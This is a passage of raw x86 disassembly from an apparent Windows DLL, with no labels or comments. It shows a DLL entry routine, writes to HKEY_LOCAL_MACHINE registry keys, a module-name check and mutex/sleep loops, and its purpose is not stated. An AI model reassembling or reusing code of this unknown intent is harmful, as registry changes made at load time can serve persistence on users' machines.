10001d82:	3b c3                	cmp    %ebx,%eax
10001d84:	0f 84 7b 01 00 00    	je     0x10001f05
10001d8a:	6a 04                	push   $0x4
10001d8c:	50                   	push   %eax
10001d8d:	89 5d 08             	mov    %ebx,0x8(%ebp)
10001d90:	ff 15 1c e1 00 10    	call   *0x1000e11c
10001d96:	8d 4d 08             	lea    0x8(%ebp),%ecx
10001d99:	51                   	push   %ecx
10001d9a:	53                   	push   %ebx
10001d9b:	6a 28                	push   $0x28
10001d9d:	50                   	push   %eax
10001d9e:	53                   	push   %ebx
10001d9f:	53                   	push   %ebx
10001da0:	ff 15 20 e1 00 10    	call   *0x1000e120
10001da6:	e9 5a 01 00 00       	jmp    0x10001f05
10001dab:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001dae:	38 58 20             	cmp    %bl,0x20(%eax)
10001db1:	74 73                	je     0x10001e26
10001db3:	83 c0 22             	add    $0x22,%eax
10001db6:	50                   	push   %eax
10001db7:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
10001dbd:	50                   	push   %eax
10001dbe:	ff d7                	call   *%edi
10001dc0:	59                   	pop    %ecx
10001dc1:	85 c0                	test   %eax,%eax
10001dc3:	59                   	pop    %ecx
10001dc4:	74 5d                	je     0x10001e23
10001dc6:	38 5d f8             	cmp    %bl,-0x8(%ebp)
10001dc9:	0f 85 36 01 00 00    	jne    0x10001f05
10001dcf:	83 7d 08 27          	cmpl   $0x27,0x8(%ebp)
10001dd3:	0f 85 2c 01 00 00    	jne    0x10001f05
10001dd9:	8d 45 f4             	lea    -0xc(%ebp),%eax
10001ddc:	89 5d 08             	mov    %ebx,0x8(%ebp)
10001ddf:	50                   	push   %eax
10001de0:	8d 45 08             	lea    0x8(%ebp),%eax
10001de3:	50                   	push   %eax
10001de4:	53                   	push   %ebx
10001de5:	68 3f 00 0f 00       	push   $0xf003f
10001dea:	53                   	push   %ebx
10001deb:	53                   	push   %ebx
10001dec:	53                   	push   %ebx
10001ded:	68 7c 00 01 10       	push   $0x1001007c
10001df2:	68 02 00 00 80       	push   $0x80000002
10001df7:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10001dfa:	ff 15 44 e0 00 10    	call   *0x1000e044
10001e00:	8b f0                	mov    %eax,%esi
10001e02:	3b f3                	cmp    %ebx,%esi
10001e04:	75 16                	jne    0x10001e1c
10001e06:	ff 75 08             	push   0x8(%ebp)
10001e09:	ff 75 fc             	push   -0x4(%ebp)
10001e0c:	e8 ef f1 ff ff       	call   0x10001000
10001e11:	59                   	pop    %ecx
10001e12:	59                   	pop    %ecx
10001e13:	ff 75 08             	push   0x8(%ebp)
10001e16:	ff 15 48 e0 00 10    	call   *0x1000e048
10001e1c:	8b c6                	mov    %esi,%eax
10001e1e:	e9 e4 00 00 00       	jmp    0x10001f07
10001e23:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001e26:	38 98 98 02 00 00    	cmp    %bl,0x298(%eax)
10001e2c:	75 08                	jne    0x10001e36
10001e2e:	38 98 22 03 00 00    	cmp    %bl,0x322(%eax)
10001e34:	74 0d                	je     0x10001e43
10001e36:	50                   	push   %eax
10001e37:	e8 98 09 00 00       	call   0x100027d4
10001e3c:	89 45 f4             	mov    %eax,-0xc(%ebp)
10001e3f:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001e42:	59                   	pop    %ecx
10001e43:	8a 48 1a             	mov    0x1a(%eax),%cl
10001e46:	80 f9 01             	cmp    $0x1,%cl
10001e49:	74 10                	je     0x10001e5b
10001e4b:	3a cb                	cmp    %bl,%cl
10001e4d:	74 0c                	je     0x10001e5b
10001e4f:	ff 75 f8             	push   -0x8(%ebp)
10001e52:	50                   	push   %eax
10001e53:	e8 23 fb ff ff       	call   0x1000197b
10001e58:	59                   	pop    %ecx
10001e59:	eb 08                	jmp    0x10001e63
10001e5b:	ff 75 f8             	push   -0x8(%ebp)
10001e5e:	e8 77 01 00 00       	call   0x10001fda
10001e63:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001e66:	59                   	pop    %ecx
10001e67:	38 98 98 02 00 00    	cmp    %bl,0x298(%eax)
10001e6d:	74 11                	je     0x10001e80
10001e6f:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
10001e72:	75 03                	jne    0x10001e77
10001e74:	88 58 19             	mov    %bl,0x19(%eax)
10001e77:	ff 75 fc             	push   -0x4(%ebp)
10001e7a:	e8 ab 01 00 00       	call   0x1000202a
10001e7f:	59                   	pop    %ecx
10001e80:	ff 75 fc             	push   -0x4(%ebp)
10001e83:	e8 cc fb ff ff       	call   0x10001a54
10001e88:	85 c0                	test   %eax,%eax
10001e8a:	59                   	pop    %ecx
10001e8b:	74 78                	je     0x10001f05
10001e8d:	6a 40                	push   $0x40
10001e8f:	33 c0                	xor    %eax,%eax
10001e91:	59                   	pop    %ecx
10001e92:	8d bd ed fd ff ff    	lea    -0x213(%ebp),%edi
10001e98:	88 9d ec fd ff ff    	mov    %bl,-0x214(%ebp)
10001e9e:	56                   	push   %esi
10001e9f:	f3 ab                	rep stos %eax,%es:(%edi)
10001ea1:	66 ab                	stos   %ax,%es:(%edi)
10001ea3:	aa                   	stos   %al,%es:(%edi)
10001ea4:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
10001eaa:	53                   	push   %ebx
10001eab:	50                   	push   %eax
10001eac:	e8 65 b4 00 00       	call   0x1000d316
10001eb1:	83 c4 0c             	add    $0xc,%esp
10001eb4:	68 d0 07 00 00       	push   $0x7d0
10001eb9:	ff 15 24 e1 00 10    	call   *0x1000e124
10001ebf:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
10001ec5:	56                   	push   %esi
10001ec6:	50                   	push   %eax
10001ec7:	68 6c 00 01 10       	push   $0x1001006c
10001ecc:	e8 6a f1 ff ff       	call   0x1000103b
10001ed1:	83 c4 0c             	add    $0xc,%esp
10001ed4:	85 c0                	test   %eax,%eax
10001ed6:	75 0d                	jne    0x10001ee5
10001ed8:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
10001ede:	50                   	push   %eax
10001edf:	ff 15 14 e1 00 10    	call   *0x1000e114
10001ee5:	68 80 00 00 00       	push   $0x80
10001eea:	ff 75 f8             	push   -0x8(%ebp)
10001eed:	ff 75 fc             	push   -0x4(%ebp)
10001ef0:	e8 4a fd ff ff       	call   0x10001c3f
10001ef5:	83 c4 0c             	add    $0xc,%esp
10001ef8:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
10001efb:	75 08                	jne    0x10001f05
10001efd:	ff 75 fc             	push   -0x4(%ebp)
10001f00:	e8 9d 03 00 00       	call   0x100022a2
10001f05:	33 c0                	xor    %eax,%eax
10001f07:	5f                   	pop    %edi
10001f08:	5e                   	pop    %esi
10001f09:	5b                   	pop    %ebx
10001f0a:	c9                   	leave
10001f0b:	c3                   	ret
10001f0c:	55                   	push   %ebp
10001f0d:	8b ec                	mov    %esp,%ebp
10001f0f:	81 ec 60 05 00 00    	sub    $0x560,%esp
10001f15:	53                   	push   %ebx
10001f16:	56                   	push   %esi
10001f17:	57                   	push   %edi
10001f18:	be 9c 00 01 10       	mov    $0x1001009c,%esi
10001f1d:	8d 7d e0             	lea    -0x20(%ebp),%edi
10001f20:	a1 98 00 01 10       	mov    0x10010098,%eax
10001f25:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001f26:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001f27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001f28:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10001f29:	6a 7f                	push   $0x7f
10001f2b:	89 45 fc             	mov    %eax,-0x4(%ebp)
10001f2e:	33 db                	xor    %ebx,%ebx
10001f30:	59                   	pop    %ecx
10001f31:	33 c0                	xor    %eax,%eax
10001f33:	8d bd a1 fa ff ff    	lea    -0x55f(%ebp),%edi
10001f39:	88 9d a0 fa ff ff    	mov    %bl,-0x560(%ebp)
10001f3f:	6a 7f                	push   $0x7f
10001f41:	f3 ab                	rep stos %eax,%es:(%edi)
10001f43:	66 ab                	stos   %ax,%es:(%edi)
10001f45:	aa                   	stos   %al,%es:(%edi)
10001f46:	59                   	pop    %ecx
10001f47:	33 c0                	xor    %eax,%eax
10001f49:	8d bd a1 fc ff ff    	lea    -0x35f(%ebp),%edi
10001f4f:	88 9d a0 fc ff ff    	mov    %bl,-0x360(%ebp)
10001f55:	f3 ab                	rep stos %eax,%es:(%edi)
10001f57:	66 ab                	stos   %ax,%es:(%edi)
10001f59:	aa                   	stos   %al,%es:(%edi)
10001f5a:	68 40 01 00 00       	push   $0x140
10001f5f:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
10001f65:	53                   	push   %ebx
10001f66:	50                   	push   %eax
10001f67:	e8 aa b3 00 00       	call   0x1000d316
10001f6c:	83 c4 0c             	add    $0xc,%esp
10001f6f:	c6 45 fc 64          	movb   $0x64,-0x4(%ebp)
10001f73:	be 00 02 00 00       	mov    $0x200,%esi
10001f78:	8d 85 a0 fc ff ff    	lea    -0x360(%ebp),%eax
10001f7e:	56                   	push   %esi
10001f7f:	50                   	push   %eax
10001f80:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001f83:	50                   	push   %eax
10001f84:	8d 45 f4             	lea    -0xc(%ebp),%eax
10001f87:	50                   	push   %eax
10001f88:	8d 45 f8             	lea    -0x8(%ebp),%eax
10001f8b:	50                   	push   %eax
10001f8c:	8d 85 a0 fa ff ff    	lea    -0x560(%ebp),%eax
10001f92:	56                   	push   %esi
10001f93:	50                   	push   %eax
10001f94:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001f97:	50                   	push   %eax
10001f98:	ff 15 80 e0 00 10    	call   *0x1000e080
10001f9e:	85 c0                	test   %eax,%eax
10001fa0:	74 1c                	je     0x10001fbe
10001fa2:	8a 45 fc             	mov    -0x4(%ebp),%al
10001fa5:	88 45 e0             	mov    %al,-0x20(%ebp)
10001fa8:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
10001fae:	50                   	push   %eax
10001faf:	8d 45 e0             	lea    -0x20(%ebp),%eax
10001fb2:	50                   	push   %eax
10001fb3:	ff 15 7c e0 00 10    	call   *0x1000e07c
10001fb9:	83 f8 ff             	cmp    $0xffffffff,%eax
10001fbc:	75 10                	jne    0x10001fce
10001fbe:	fe 45 fc             	incb   -0x4(%ebp)
10001fc1:	43                   	inc    %ebx
10001fc2:	83 fb 16             	cmp    $0x16,%ebx
10001fc5:	76 b1                	jbe    0x10001f78
10001fc7:	32 c0                	xor    %al,%al
10001fc9:	5f                   	pop    %edi
10001fca:	5e                   	pop    %esi
10001fcb:	5b                   	pop    %ebx
10001fcc:	c9                   	leave
10001fcd:	c3                   	ret
10001fce:	50                   	push   %eax
10001fcf:	ff 15 78 e0 00 10    	call   *0x1000e078
10001fd5:	8a 45 fc             	mov    -0x4(%ebp),%al
10001fd8:	eb ef                	jmp    0x10001fc9
10001fda:	55                   	push   %ebp
10001fdb:	8b ec                	mov    %esp,%ebp
10001fdd:	83 ec 20             	sub    $0x20,%esp
10001fe0:	56                   	push   %esi
10001fe1:	57                   	push   %edi
10001fe2:	be bc 00 01 10       	mov    $0x100100bc,%esi
10001fe7:	8d 7d f0             	lea    -0x10(%ebp),%edi
10001fea:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001feb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001fec:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001fed:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10001fee:	be ac 00 01 10       	mov    $0x100100ac,%esi
10001ff3:	8d 7d e0             	lea    -0x20(%ebp),%edi
10001ff6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001ff7:	8a 45 08             	mov    0x8(%ebp),%al
10001ffa:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001ffb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001ffc:	84 c0                	test   %al,%al
10001ffe:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10001fff:	74 25                	je     0x10002026
10002001:	8b 35 5c e1 00 10    	mov    0x1000e15c,%esi
10002007:	6a 07                	push   $0x7
10002009:	88 45 f0             	mov    %al,-0x10(%ebp)
1000200c:	88 45 e0             	mov    %al,-0x20(%ebp)
1000200f:	c6 45 f5 64          	movb   $0x64,-0xb(%ebp)
10002013:	5f                   	pop    %edi
10002014:	8d 45 f0             	lea    -0x10(%ebp),%eax
10002017:	50                   	push   %eax
10002018:	ff d6                	call   *%esi
1000201a:	fe 45 f5             	incb   -0xb(%ebp)
1000201d:	4f                   	dec    %edi
1000201e:	75 f4                	jne    0x10002014
10002020:	8d 45 e0             	lea    -0x20(%ebp),%eax
10002023:	50                   	push   %eax
10002024:	ff d6                	call   *%esi
10002026:	5f                   	pop    %edi
10002027:	5e                   	pop    %esi
10002028:	c9                   	leave
10002029:	c3                   	ret
1000202a:	55                   	push   %ebp
1000202b:	8b ec                	mov    %esp,%ebp
1000202d:	83 ec 1c             	sub    $0x1c,%esp
10002030:	8b 45 08             	mov    0x8(%ebp),%eax
10002033:	83 4d f4 ff          	orl    $0xffffffff,-0xc(%ebp)
10002037:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
1000203b:	53                   	push   %ebx
1000203c:	33 db                	xor    %ebx,%ebx
1000203e:	c7 45 ec 08 00 00 00 	movl   $0x8,-0x14(%ebp)
10002045:	3b c3                	cmp    %ebx,%eax
10002047:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
1000204a:	0f 84 b3 00 00 00    	je     0x10002103
10002050:	83 c0 19             	add    $0x19,%eax
10002053:	89 45 e8             	mov    %eax,-0x18(%ebp)
10002056:	8a 00                	mov    (%eax),%al
10002058:	3c ff                	cmp    $0xff,%al
1000205a:	75 08                	jne    0x10002064
1000205c:	6a 01                	push   $0x1
1000205e:	58                   	pop    %eax
1000205f:	e9 a2 00 00 00       	jmp    0x10002106
10002064:	33 c9                	xor    %ecx,%ecx
10002066:	3a c3                	cmp    %bl,%al
10002068:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000206b:	50                   	push   %eax
1000206c:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000206f:	50                   	push   %eax
10002070:	53                   	push   %ebx
10002071:	68 3f 00 0f 00       	push   $0xf003f
10002076:	53                   	push   %ebx
10002077:	0f 95 c1             	setne  %cl
1000207a:	53                   	push   %ebx
1000207b:	53                   	push   %ebx
1000207c:	41                   	inc    %ecx
1000207d:	68 7c 00 01 10       	push   $0x1001007c
10002082:	68 02 00 00 80       	push   $0x80000002
10002087:	89 4d f0             	mov    %ecx,-0x10(%ebp)
1000208a:	ff 15 44 e0 00 10    	call   *0x1000e044
10002090:	85 c0                	test   %eax,%eax
10002092:	74 04                	je     0x10002098
10002094:	33 c0                	xor    %eax,%eax
10002096:	eb 6e                	jmp    0x10002106
10002098:	56                   	push   %esi
10002099:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000209c:	8b 35 4c e0 00 10    	mov    0x1000e04c,%esi
100020a2:	6a 04                	push   $0x4
100020a4:	50                   	push   %eax
100020a5:	6a 03                	push   $0x3
100020a7:	53                   	push   %ebx
100020a8:	68 dc 00 01 10       	push   $0x100100dc
100020ad:	ff 75 fc             	push   -0x4(%ebp)
100020b0:	ff d6                	call   *%esi
100020b2:	ff 75 fc             	push   -0x4(%ebp)
100020b5:	ff 75 08             	push   0x8(%ebp)
100020b8:	e8 43 ef ff ff       	call   0x10001000
100020bd:	59                   	pop    %ecx
100020be:	85 c0                	test   %eax,%eax
100020c0:	59                   	pop    %ecx
100020c1:	74 13                	je     0x100020d6
100020c3:	8d 45 ec             	lea    -0x14(%ebp),%eax
100020c6:	6a 04                	push   $0x4
100020c8:	50                   	push   %eax
100020c9:	6a 03                	push   $0x3
100020cb:	53                   	push   %ebx
100020cc:	68 10 00 01 10       	push   $0x10010010
100020d1:	ff 75 fc             	push   -0x4(%ebp)
100020d4:	ff d6                	call   *%esi
100020d6:	6a 01                	push   $0x1
100020d8:	ff 75 e8             	push   -0x18(%ebp)
100020db:	6a 03                	push   $0x3
100020dd:	53                   	push   %ebx
100020de:	68 d4 00 01 10       	push   $0x100100d4
100020e3:	ff 75 fc             	push   -0x4(%ebp)
100020e6:	ff d6                	call   *%esi
100020e8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
100020eb:	6a 04                	push   $0x4
100020ed:	50                   	push   %eax
100020ee:	6a 03                	push   $0x3
100020f0:	53                   	push   %ebx
100020f1:	68 cc 00 01 10       	push   $0x100100cc
100020f6:	ff 75 fc             	push   -0x4(%ebp)
100020f9:	ff d6                	call   *%esi
100020fb:	85 c0                	test   %eax,%eax
100020fd:	5e                   	pop    %esi
100020fe:	75 03                	jne    0x10002103
10002100:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10002103:	8b 45 f8             	mov    -0x8(%ebp),%eax
10002106:	5b                   	pop    %ebx
10002107:	c9                   	leave
10002108:	c3                   	ret
10002109:	55                   	push   %ebp
1000210a:	8b ec                	mov    %esp,%ebp
1000210c:	81 ec 04 01 00 00    	sub    $0x104,%esp
10002112:	80 a5 fc fe ff ff 00 	andb   $0x0,-0x104(%ebp)
10002119:	57                   	push   %edi
1000211a:	6a 40                	push   $0x40
1000211c:	33 c0                	xor    %eax,%eax
1000211e:	59                   	pop    %ecx
1000211f:	8d bd fd fe ff ff    	lea    -0x103(%ebp),%edi
10002125:	f3 ab                	rep stos %eax,%es:(%edi)
10002127:	66 ab                	stos   %ax,%es:(%edi)
10002129:	aa                   	stos   %al,%es:(%edi)
1000212a:	8b 45 08             	mov    0x8(%ebp),%eax
1000212d:	5f                   	pop    %edi
1000212e:	a3 50 07 01 10       	mov    %eax,0x10010750
10002133:	8b 45 0c             	mov    0xc(%ebp),%eax
10002136:	83 e8 00             	sub    $0x0,%eax
10002139:	74 69                	je     0x100021a4
1000213b:	48                   	dec    %eax
1000213c:	0f 85 8f 00 00 00    	jne    0x100021d1
10002142:	e8 90 00 00 00       	call   0x100021d7
10002147:	85 c0                	test   %eax,%eax
10002149:	74 0a                	je     0x10002155
1000214b:	6a 27                	push   $0x27
1000214d:	e8 4a fb ff ff       	call   0x10001c9c
10002152:	59                   	pop    %ecx
10002153:	eb 7c                	jmp    0x100021d1
10002155:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
1000215b:	68 04 01 00 00       	push   $0x104
10002160:	50                   	push   %eax
10002161:	ff 35 50 07 01 10    	push   0x10010750
10002167:	ff 15 bc e0 00 10    	call   *0x1000e0bc
1000216d:	85 c0                	test   %eax,%eax
1000216f:	74 60                	je     0x100021d1
10002171:	83 65 08 00          	andl   $0x0,0x8(%ebp)
10002175:	8d 45 08             	lea    0x8(%ebp),%eax
10002178:	50                   	push   %eax
10002179:	e8 79 f4 ff ff       	call   0x100015f7
1000217e:	85 c0                	test   %eax,%eax
10002180:	59                   	pop    %ecx
10002181:	75 4e                	jne    0x100021d1
10002183:	8b 45 08             	mov    0x8(%ebp),%eax
10002186:	05 60 01 00 00       	add    $0x160,%eax
1000218b:	50                   	push   %eax
1000218c:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
10002192:	50                   	push   %eax
10002193:	ff 15 b0 e1 00 10    	call   *0x1000e1b0
10002199:	59                   	pop    %ecx
1000219a:	85 c0                	test   %eax,%eax
1000219c:	59                   	pop    %ecx
1000219d:	74 32                	je     0x100021d1
1000219f:	6a 01                	push   $0x1
100021a1:	58                   	pop    %eax
100021a2:	eb 2f                	jmp    0x100021d3
100021a4:	68 d0 07 00 00       	push   $0x7d0
100021a9:	ff 35 5c 07 01 10    	push   0x1001075c
100021af:	ff 15 84 e0 00 10    	call   *0x1000e084
100021b5:	85 c0                	test   %eax,%eax
100021b7:	75 18                	jne    0x100021d1
100021b9:	56                   	push   %esi
100021ba:	8b 35 30 e1 00 10    	mov    0x1000e130,%esi
100021c0:	ff 35 5c 07 01 10    	push   0x1001075c
100021c6:	ff d6                	call   *%esi
100021c8:	ff 35 60 07 01 10    	push   0x10010760
100021ce:	ff d6                	call   *%esi
100021d0:	5e                   	pop    %esi
100021d1:	33 c0                	xor    %eax,%eax
100021d3:	c9                   	leave
100021d4:	c2 0c 00             	ret    $0xc
100021d7:	55                   	push   %ebp
100021d8:	8b ec                	mov    %esp,%ebp
100021da:	83 ec 34             	sub    $0x34,%esp
100021dd:	80 65 cc 00          	andb   $0x0,-0x34(%ebp)
100021e1:	53                   	push   %ebx
100021e2:	56                   	push   %esi
100021e3:	57                   	push   %edi
100021e4:	6a 07                	push   $0x7
100021e6:	33 c0                	xor    %eax,%eax
100021e8:	59                   	pop    %ecx
100021e9:	8d 7d cd             	lea    -0x33(%ebp),%edi
100021ec:	f3 ab                	rep stos %eax,%es:(%edi)
100021ee:	66 ab                	stos   %ax,%es:(%edi)
100021f0:	aa                   	stos   %al,%es:(%edi)
100021f1:	8d 45 fc             	lea    -0x4(%ebp),%eax
100021f4:	50                   	push   %eax
100021f5:	e8 fd f3 ff ff       	call   0x100015f7
100021fa:	85 c0                	test   %eax,%eax
100021fc:	59                   	pop    %ecx
100021fd:	75 68                	jne    0x10002267
100021ff:	20 45 ec             	and    %al,-0x14(%ebp)
10002202:	8d 7d ed             	lea    -0x13(%ebp),%edi
10002205:	ab                   	stos   %eax,%es:(%edi)
10002206:	ab                   	stos   %eax,%es:(%edi)
10002207:	ab                   	stos   %eax,%es:(%edi)
10002208:	66 ab                	stos   %ax,%es:(%edi)
1000220a:	aa                   	stos   %al,%es:(%edi)
1000220b:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000220e:	6a 0a                	push   $0xa
10002210:	50                   	push   %eax
10002211:	8b 45 fc             	mov    -0x4(%ebp),%eax
10002214:	0f b6 40 19          	movzbl 0x19(%eax),%eax
10002218:	50                   	push   %eax
10002219:	ff 15 9c e1 00 10    	call   *0x1000e19c
1000221f:	be e4 00 01 10       	mov    $0x100100e4,%esi
10002224:	6a 10                	push   $0x10
10002226:	8d 45 cc             	lea    -0x34(%ebp),%eax
10002229:	56                   	push   %esi
1000222a:	50                   	push   %eax
1000222b:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10002231:	8d 45 ec             	lea    -0x14(%ebp),%eax
10002234:	50                   	push   %eax
10002235:	8d 45 cc             	lea    -0x34(%ebp),%eax
10002238:	50                   	push   %eax
10002239:	e8 d2 b0 00 00       	call   0x1000d310
1000223e:	83 c4 20             	add    $0x20,%esp
10002241:	bf 00 00 02 00       	mov    $0x20000,%edi
10002246:	56                   	push   %esi
10002247:	8b 35 8c e0 00 10    	mov    0x1000e08c,%esi
1000224d:	6a 01                	push   $0x1
1000224f:	57                   	push   %edi
10002250:	ff d6                	call   *%esi
10002252:	85 c0                	test   %eax,%eax
10002254:	74 18                	je     0x1000226e
10002256:	50                   	push   %eax
10002257:	ff 15 30 e1 00 10    	call   *0x1000e130
1000225d:	ff 75 fc             	push   -0x4(%ebp)
10002260:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
10002266:	59                   	pop    %ecx
10002267:	33 c0                	xor    %eax,%eax
10002269:	5f                   	pop    %edi
1000226a:	5e                   	pop    %esi
1000226b:	5b                   	pop    %ebx
1000226c:	c9                   	leave
1000226d:	c3                   	ret
1000226e:	8b 1d 60 e1 00 10    	mov    0x1000e160,%ebx
10002274:	ff d3                	call   *%ebx
10002276:	83 f8 02             	cmp    $0x2,%eax
10002279:	75 ec                	jne    0x10002267
1000227b:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000227e:	50                   	push   %eax
1000227f:	6a 01                	push   $0x1
10002281:	57                   	push   %edi
10002282:	ff d6                	call   *%esi
10002284:	85 c0                	test   %eax,%eax
10002286:	75 ce                	jne    0x10002256
10002288:	ff d3                	call   *%ebx
1000228a:	83 f8 02             	cmp    $0x2,%eax
1000228d:	75 ce                	jne    0x1000225d
1000228f:	8d 45 cc             	lea    -0x34(%ebp),%eax
10002292:	50                   	push   %eax
10002293:	6a 01                	push   $0x1
10002295:	6a 00                	push   $0x0
10002297:	ff 15 88 e0 00 10    	call   *0x1000e088
1000229d:	6a 01                	push   $0x1
1000229f:	58                   	pop    %eax
100022a0:	eb c7                	jmp    0x10002269
100022a2:	55                   	push   %ebp
100022a3:	8b ec                	mov    %esp,%ebp
100022a5:	81 ec 68 01 00 00    	sub    $0x168,%esp
100022ab:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
100022af:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
100022b3:	83 4d e8 ff          	orl    $0xffffffff,-0x18(%ebp)
100022b7:	53                   	push   %ebx
100022b8:	56                   	push   %esi
100022b9:	8b 35 c0 e1 00 10    	mov    0x1000e1c0,%esi
100022bf:	57                   	push   %edi
100022c0:	bf 00 01 00 00       	mov    $0x100,%edi
100022c5:	57                   	push   %edi
100022c6:	ff d6                	call   *%esi
100022c8:	8b d8                	mov    %eax,%ebx
100022ca:	59                   	pop    %ecx
100022cb:	85 db                	test   %ebx,%ebx
100022cd:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
100022d0:	75 08                	jne    0x100022da
100022d2:	83 c8 ff             	or     $0xffffffff,%eax
100022d5:	e9 8c 02 00 00       	jmp    0x10002566
100022da:	57                   	push   %edi
100022db:	6a 00                	push   $0x0
100022dd:	53                   	push   %ebx
100022de:	e8 33 b0 00 00       	call   0x1000d316
100022e3:	8b 45 08             	mov    0x8(%ebp),%eax
100022e6:	68 ff 00 00 00       	push   $0xff
100022eb:	05 2e 04 00 00       	add    $0x42e,%eax
100022f0:	50                   	push   %eax
100022f1:	53                   	push   %ebx
100022f2:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
100022f8:	53                   	push   %ebx
100022f9:	e8 62 b0 00 00       	call   0x1000d360
100022fe:	bf 00 08 00 00       	mov    $0x800,%edi
10002303:	89 45 d8             	mov    %eax,-0x28(%ebp)
10002306:	57                   	push   %edi
10002307:	ff d6                	call   *%esi
10002309:	83 c4 20             	add    $0x20,%esp
1000230c:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000230f:	85 c0                	test   %eax,%eax
10002311:	0f 84 34 02 00 00    	je     0x1000254b
10002317:	57                   	push   %edi
10002318:	6a 00                	push   $0x0
1000231a:	50                   	push   %eax
1000231b:	e8 f6 af 00 00       	call   0x1000d316
10002320:	68 40 01 00 00       	push   $0x140
10002325:	8d 85 98 fe ff ff    	lea    -0x168(%ebp),%eax
1000232b:	6a 00                	push   $0x0
1000232d:	50                   	push   %eax
1000232e:	e8 e3 af 00 00       	call   0x1000d316
10002333:	bf 04 01 00 00       	mov    $0x104,%edi
10002338:	57                   	push   %edi
10002339:	ff d6                	call   *%esi
1000233b:	57                   	push   %edi
1000233c:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000233f:	ff d6                	call   *%esi
10002341:	83 c4 20             	add    $0x20,%esp
10002344:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
10002348:	8b d8                	mov    %eax,%ebx
1000234a:	89 5d dc             	mov    %ebx,-0x24(%ebp)
1000234d:	0f 84 ec 01 00 00    	je     0x1000253f
10002353:	85 db                	test   %ebx,%ebx
10002355:	0f 84 da 01 00 00    	je     0x10002535
1000235b:	57                   	push   %edi
1000235c:	6a 00                	push   $0x0
1000235e:	ff 75 f4             	push   -0xc(%ebp)
10002361:	e8 b0 af 00 00       	call   0x1000d316
10002366:	57                   	push   %edi
10002367:	6a 00                	push   $0x0
10002369:	53                   	push   %ebx
1000236a:	e8 a7 af 00 00       	call   0x1000d316
1000236f:	83 c4 18             	add    $0x18,%esp
10002372:	57                   	push   %edi
10002373:	53                   	push   %ebx
10002374:	68 04 01 01 10       	push   $0x10010104
10002379:	ff 15 6c e1 00 10    	call   *0x1000e16c
1000237f:	85 c0                	test   %eax,%eax
10002381:	74 75                	je     0x100023f8
10002383:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
10002387:	80 65 ff 00          	andb   $0x0,-0x1(%ebp)
1000238b:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
1000238f:	75 67                	jne    0x100023f8
10002391:	8b 45 08             	mov    0x8(%ebp),%eax
10002394:	57                   	push   %edi
10002395:	ff 75 f4             	push   -0xc(%ebp)
10002398:	05 94 01 00 00       	add    $0x194,%eax
1000239d:	50                   	push   %eax
1000239e:	8d 45 e8             	lea    -0x18(%ebp),%eax
100023a1:	53                   	push   %ebx
100023a2:	50                   	push   %eax
100023a3:	e8 c1 02 00 00       	call   0x10002669
100023a8:	83 c4 14             	add    $0x14,%esp
100023ab:	85 c0                	test   %eax,%eax
100023ad:	74 3f                	je     0x100023ee
100023af:	57                   	push   %edi
100023b0:	53                   	push   %ebx
100023b1:	68 20 00 01 10       	push   $0x10010020
100023b6:	ff 15 6c e1 00 10    	call   *0x1000e16c
100023bc:	85 c0                	test   %eax,%eax
100023be:	74 32                	je     0x100023f2
100023c0:	8b 45 08             	mov    0x8(%ebp),%eax
100023c3:	57                   	push   %edi
100023c4:	ff 75 f4             	push   -0xc(%ebp)
100023c7:	05 94 01 00 00       	add    $0x194,%eax
100023cc:	50                   	push   %eax
100023cd:	8d 45 e8             	lea    -0x18(%ebp),%eax
100023d0:	53                   	push   %ebx
100023d1:	50                   	push   %eax
100023d2:	e8 92 02 00 00       	call   0x10002669
100023d7:	83 c4 14             	add    $0x14,%esp
100023da:	85 c0                	test   %eax,%eax
100023dc:	74 10                	je     0x100023ee
100023de:	ff 45 f0             	incl   -0x10(%ebp)
100023e1:	68 e8 03 00 00       	push   $0x3e8
100023e6:	ff 15 24 e1 00 10    	call   *0x1000e124
100023ec:	eb 04                	jmp    0x100023f2
